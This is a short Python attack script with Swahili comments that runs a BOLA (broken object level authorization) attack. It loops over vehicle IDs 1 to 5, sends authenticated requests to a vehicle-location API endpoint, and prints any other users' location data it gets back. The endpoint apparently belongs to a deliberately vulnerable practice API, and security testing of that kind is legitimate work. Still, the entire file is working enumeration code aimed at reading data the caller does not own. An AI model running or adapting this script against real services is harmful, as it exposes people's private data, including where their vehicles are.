import requests

def run_bola(base_url, login_token):
    print("\n[*] Inazindua shambulio la BOLA...")
    
    # Kwenye BOLA tunabadilisha ID kwenye URL kuona data za watu wengine
    # Tutajaribu namba za ID kuanzia 1 hadi 5 kiotomatiki
    for vehicle_id in range(1, 6):
        target_url = f"{base_url}/identity/api/v1/vehicles/{vehicle_id}/location"
        headers = {"Authorization": f"Bearer {login_token}"}
        
        response = requests.get(target_url, headers=headers)
        
        if response.status_code == 200:
            print(f"[+] UDHAIFU WA BOLA UGUNDULIWA! ID {vehicle_id} imetoa data: {response.json()}")
        else:
            print(f"[-] ID {vehicle_id}: Imegomewa (Status Code: {response.status_code})")
